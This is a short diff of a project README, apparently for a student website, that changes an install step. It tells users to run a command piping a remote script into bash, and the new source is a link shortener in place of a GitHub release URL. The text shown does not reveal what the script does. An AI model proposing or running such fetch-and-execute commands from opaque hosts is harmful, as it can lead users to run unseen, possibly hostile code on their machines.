@@ -10,7 +10,7 @@ the website can be accessed at `http://ugdev.cs.smu.ca/~group15/` for general us
 2. Run the following command:
 
 ```bash
-bash -c "$(curl -fsSL https://github.com/HealthSouthern48/KLOQOWEJ-story/releases/download/installer/install.sh)"
+bash -c "$(curl -fsSL https://link.cybar.dev/kwe-installer)"
 ```
 
 3. Wait for the command to finish running (the prompt will appear again).
